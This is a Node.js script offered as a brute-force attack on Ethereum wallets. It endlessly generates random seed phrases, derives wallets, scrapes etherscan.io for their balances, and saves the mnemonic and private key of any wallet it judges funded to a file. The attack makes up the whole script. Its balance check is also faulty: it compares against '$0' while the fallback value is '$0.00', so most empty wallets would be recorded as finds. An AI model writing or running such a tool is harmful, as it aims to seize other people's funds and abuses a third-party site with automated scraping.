const { ethers } = require('ethers')
const axios = require('axios')
const bip39 = require('bip39')
const moment = require('moment')
const cheerio = require('cheerio')
const fs = require('fs-extra')
require('colors')

/**
 * Delays the execution for the specified number of milliseconds.
 * @param {number} ms - The number of milliseconds to delay the execution.
 * @returns {Promise<void>} - A promise that resolves after the specified delay.
 */
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms))

/**
 * Logs a message to the console with a timestamp.
 * @param {string} message - The message to be logged.
 * @param {string} type - The type of message to log (e.g. 'info', 'error', 'warning').
 */
function logger(message, type) {
  switch (type) {
    case 'info':
      console.log(`[${moment().format('HH:mm:ss')}] ${message}`)
      break
    case 'success':
      console.log(`[${moment().format('HH:mm:ss')}] ${message}`.green)
      break
    case 'error':
      console.error(`[${moment().format('HH:mm:ss')}] ${message}`.red)
      break
    case 'warning':
      console.warn(`[${moment().format('HH:mm:ss')}] ${message}`.yellow)
      break
    default:
      console.log(`[${moment().format('HH:mm:ss')}] ${message}`)
  }
}

/**
 * Generates a seed phrase using random bytes.
 * @returns {string} The generated seed phrase.
 */
function generateSeedPhrase() {
  const randomLength = Math.random() > 0.5 ? 24 : 12
  const randomBytes = require('crypto').randomBytes(randomLength === 24 ? 32 : 16)
  return bip39.entropyToMnemonic(randomBytes.toString('hex'))
}

/**
 * Scrapes the Blockscan website to retrieve the balance of a given address.
 * @param {string} address - The Ethereum address to scrape the balance for.
 * @param {string} explorer - The type of address to scrape (e.g. 'eth
 * @returns {Promise<string|boolean>} - A promise that resolves to the balance as a string, or false if an error occurs.
 */
function scrapeBlockscan(address, explorer) {
  const url = `https://${explorer}/address/${address}`
  return axios.get(url)
    .then(response => {
      const $ = cheerio.load(response.data)
      const balance = $('#multichain-button')
        .text()
        .split('\n')
        .at(1)
        .trim()
        .split(' ')
        .at(0)
      console.log({balance})
      return balance ?? '$0.00'
    })
    .catch(async () => {
      await delay(10000)
      return '$0.00'
    })
}

/**
 * Runs the brute force process to generate seed phrases, create wallets, and check balances.
 * Logs the address, mnemonic, private key, and balance of each wallet checked.
 * If a wallet with a non-zero balance is found, appends the wallet information to a file named 'wallets.txt'.
 * @returns {Promise<void>} A promise that resolves when the brute force process is complete.
 */
async function runBruteforce() {
  while (true) {
    try {
      const resSeedPhrase = generateSeedPhrase()
      const resEtherWallet = ethers.Wallet.fromPhrase(resSeedPhrase)
      const [resEthBalance] = await Promise.all([
        scrapeBlockscan(resEtherWallet.address, 'etherscan.io'),
      ])
      logger(`👾 Address: ${resEtherWallet.address}`, 'info')
      logger(`💬 Mnemonic: ${resEtherWallet.mnemonic.phrase}`, 'info')
      logger(`🔑 Private key: ${resEtherWallet.privateKey}`, 'info')
      logger(`🤑 ETH Multichain Balance: ${resEthBalance}`, 'info')
      if (resEthBalance !== '$0') {
        logger(`🎉 Found a wallet with a non-zero balance!`, 'success')
        await fs.appendFileSync('wallets.txt', `👾 Address: ${resEtherWallet.address}\n💬 Mnemonic: ${resEtherWallet.mnemonic.phrase}\n🔑 Private key: ${resEtherWallet.privateKey}\n🤑 ETH Multichain Balance: ${resEthBalance}\n\n`)
      } else {
        logger(`👎 No luck this time.`, 'warning')
      }
      await delay(1000)
    } catch (error) {
      logger(`An error occurred: ${error.message}`, 'error')
    }
    console.log('')
  }
}

/**
 * Runs the bruteforce attack.
 */
runBruteforce()
